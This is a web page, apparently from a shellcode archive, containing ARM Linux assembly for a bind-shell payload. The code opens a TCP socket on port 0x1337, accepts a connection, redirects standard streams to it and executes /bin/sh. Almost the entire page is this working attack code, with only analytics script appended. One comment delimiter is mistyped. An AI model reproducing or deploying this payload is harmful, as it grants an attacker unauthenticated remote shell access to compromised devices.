<html><head><title>Linux/ARM - Bindshell port 0x1337</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * Title: arm-bind-listen
 * Brief: Bind a shell to port 0x1337 on any local address and
 *        wait for connections
 * Author: Daniel Godas-Lopez &lt;gmail account dgodas&gt;
 */
 
    /*
      soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     */
 
    mov %r0, $2     /* AF_INET */
    mov %r1, $1     /* SOCK_STREAM */
    mov %r2, $6     /* IPPRTOTO_TCP */
    push {%r0, %r1, %r2}
    mov %r0, $1     /* socket */
    mov %r1, %sp
    svc 0x00900066
    add %sp, %sp, $12
 
    mov %r6, %r0        /* r6 = soc_des */
 
    /*
      bind(soc_des, (struct sockaddr *) &amp;serv_addr, sizeof(serv_addr));
     */
 
.if 0 /* r0 == r6 already */
    mov %r0, %r6        /* soc_des */
.endif
 
    mov %r1, $0x37
    mov %r7, $0x13
    mov %r1, %r1, lsl $24
    add %r1, %r7, lsl $16
    add %r1, $2     /* port = 0x1337, family = 2 (AF_INET) */
    sub %r2, %r2, %r2   /* addr = 0.0.0.0 */
    push {%r1, %r2}
    mov %r1, %sp        /* pointer to sockaddr_in */
    mov %r2, $16        /* sizeof(struct sockaddr_in) */
     
    push {%r0, %r1, %r2}
    mov %r0, $2     /* bind */
    mov %r1, %sp
    svc 0x00900066
    add %sp, %sp, $20
 
    /*
      listen(soc_des, 1);
     /*
 
    mov %r1, $1     /* backlog (see man 2 listen) */
    mov %r0, %r6        /* soc_des */
    push {%r0, %r1}
    mov %r0, $4     /* listen */
    mov %r1, %sp
    svc 0x00900066
    add %sp, $8
 
    /*
      soc_cli = accept(soc_des, 0, 0);
     */
 
    mov %r0, %r6        /* soc_des */
    sub %r1, %r1, %r1
    sub %r2, %r2, %r2
    push {%r0, %r1, %r2}
    mov %r0, $5     /* accept */
    mov %r1, %sp
    svc 0x00900066
    add %sp, %sp, $12
 
    mov %r6, %r0        /* r6 = soc_cli */
 
    /*
      dup2(soc_cli,0);
      dup2(soc_cli,1);
      dup2(soc_cli,2);
     */
    mov %r1, $2
1:  mov %r0, %r6
    svc 0x0090003f
    subs %r1, %r1, $1
    bpl 1b
 
    /*
      execve(&quot;/bin/sh&quot;, parms, env);
     */
 
    sub %r1, %sp, $4    /* argv[0] = &quot;sh&quot; */
    sub %r2, %r2, %r2   /* argv[1] = 0x00000000 */
    mov %r3, $0x2f
    mov %r7, $0x62
    add %r3, %r7, lsl $8
    mov %r7, $0x69
    add %r3, %r7, lsl $16
    mov %r7, $0x6e
    add %r3, %r7, lsl $24   /* '/'  'b'  'i'  'n'  */
    mov %r4, $0x2f
    mov %r7, $0x73
    add %r4, %r7, lsl $8
    mov %r7, $0x68
    add %r4, %r7, lsl $16   /* '/'  's'  'h'  0x00 */
    mov %r5, $0x73
    mov %r7, $0x68
    add %r5, %r7, lsl $8    /* 's'  'h'  0x00 0x00 */
 
    push {%r1, %r2, %r3, %r4, %r5}
 
    add %r0, %sp, $8    /* filename ptr */
    add %r1, %sp, $0    /* argv ptr */
    add %r2, %sp, $4    /* env ptr */
 
    svc 0x0090000b

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
